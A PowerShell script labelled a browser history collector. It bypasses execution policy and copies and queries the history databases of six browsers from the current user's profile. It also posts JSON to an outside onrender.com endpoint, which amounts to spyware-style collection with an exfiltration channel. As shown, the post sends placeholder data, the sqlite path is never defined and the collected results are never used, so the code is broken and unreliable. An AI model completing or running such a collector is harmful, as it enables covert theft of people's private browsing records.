# --- Browser History Collector (Full JSON Version) ---
# Supports: Chrome, Edge, Brave, Opera, Yandex, Firefox
# --- Script starts ---

# --- EXECUTION POLICY BYPASS (SAFE) ---
try {
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -ErrorAction Stop
}
catch {
}

# --- CONFIGURATION ---
$UserName   = $env:USERNAME
$UserHome   = [Environment]::GetFolderPath('UserProfile')

# --- OUTPUT DIRECTORY ---
# send to the endpoint
$ScriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Definition
$data = @{
    Key1 = "Value1"
    Key2 = "Value2"
    NestedObject = @{
        SubKey = "SubValue"
    }
}
$jsonBody = $data | ConvertTo-Json
# --- ENDPOINT CONFIGURATION ---
$endpointUri = "https://backlify-v2.onrender.com/api/analysis"
$data = @{
    Key1 = "Value1"
    Key2 = "Value2"
    NestedObject = @{
        SubKey = "SubValue"
    }
}
$jsonBody = $data | ConvertTo-Json

# --- TEST ENDPOINT AVAILABILITY ---
try {
    $uri = [System.Uri]$endpointUri
    $pingResult = Test-NetConnection -ComputerName $uri.Host -Port 443 -WarningAction SilentlyContinue

    if ($pingResult.TcpTestSucceeded) {
        Write-Host "[+] Endpoint reachable, sending JSON..." -ForegroundColor Green
        try {
            Invoke-RestMethod -Method Post -Uri $endpointUri -Body $jsonBody -ContentType "application/json"
            Write-Host "[+] Data sent successfully!" -ForegroundColor Green
        } catch {
            Write-Warning "[-] Failed to send data: $_"
        }
    } else {
        Write-Warning "[-] Endpoint not reachable. Skipping Invoke-RestMethod."
    }
} catch {
    Write-Warning "[-] Invalid endpoint or network error: $_"
}

# --- HISTORY FILE LOCATIONS ---
$BrowserPaths = @{
    "Chrome"  = Join-Path $UserHome "AppData\Local\Google\Chrome\User Data\Default\History"
    "Edge"    = Join-Path $UserHome "AppData\Local\Microsoft\Edge\User Data\Default\History"
    "Brave"   = Join-Path $UserHome "AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
    "Opera"   = Join-Path $UserHome "AppData\Roaming\Opera Software\Opera Stable\History"
    "Yandex"  = Join-Path $UserHome "AppData\Local\Yandex\YandexBrowser\User Data\Default\History"
}

# --- FIREFOX SUPPORT ---
$FirefoxDir = Join-Path $UserHome "AppData\Roaming\Mozilla\Firefox\Profiles"
if (Test-Path $FirefoxDir) {
    $FirefoxProfile = Get-ChildItem $FirefoxDir -Directory -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($FirefoxProfile) {
        $BrowserPaths["Firefox"] = Join-Path $FirefoxProfile.FullName "places.sqlite"
    }
}

# --- TEMP DIRECTORY FOR COPIES ---
$TempDir = Join-Path $env:TEMP ("browser_dbs_" + (Get-Date -Format "yyyyMMdd_HHmmss"))
New-Item -ItemType Directory -Force -Path $TempDir | Out-Null

# --- COPY DBs TO TEMP ---
$DbFiles = @{}
foreach ($Browser in $BrowserPaths.Keys) {
    $Src = $BrowserPaths[$Browser]
    if ($Src -and (Test-Path $Src)) {
        $Dest = Join-Path $TempDir ("${Browser}_history.sqlite")
        Copy-Item $Src $Dest -Force
        $DbFiles[$Browser] = $Dest
    }
}

if ($DbFiles.Count -eq 0) {
    exit
}

# --- REGEX FOR URL VALIDATION ---
$UrlRegex = '(https?|ftp)://[^\s"]+'

# --- RESULT HOLDER ---
$Results = @()

foreach ($Browser in $DbFiles.Keys) {
    $DbPath = $DbFiles[$Browser]

    if ($Browser -eq "Firefox") {
        $Query = @"
SELECT 
    datetime(visit_date/1000000,'unixepoch') AS visit_time,
    url,
    title
FROM moz_places
ORDER BY visit_date DESC
LIMIT 200;
"@
    } else {
        $Query = @"
SELECT 
    datetime(last_visit_time/1000000-11644473600,'unixepoch') AS visit_time,
    url,
    title
FROM urls
ORDER BY last_visit_time DESC
LIMIT 200;
"@
    }

    try {
        $RawOutput = & $SqlitePath -separator "|" $DbPath $Query 2>$null

        foreach ($Line in $RawOutput -split "`r?`n") {
            if ($Line -match $UrlRegex) {
                $Parts = $Line -split '\|'
                if ($Parts.Count -ge 2) {
                    $Results += [PSCustomObject]@{
                        Browser   = $Browser
                        VisitTime = ($Parts[0]).Trim()
                        URL       = ($Parts[1]).Trim()
                        Title     = if ($Parts.Count -ge 3) { ($Parts[2]).Trim() } else { "" }
                    }
                }
            }
        }
    }
    catch {
        Write-Warning "Failed to parse $Browser history: $_"
    }
}

# --- OUTPUT JSON ---
if ($Results.Count -gt 0) {
    $JsonOutput = $Results | ConvertTo-Json -Depth 4
} else {
    Write-Warning "[-] No valid browser entries found after filtering. Check profiles or regex."
}

# --- CLEANUP TEMP FILES ---
Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue

# Start-Process -FilePath ".\script_browser.ps1" -ArgumentList "arg1", "arg2" -WorkingDirectory "./script_dhcp.ps1"
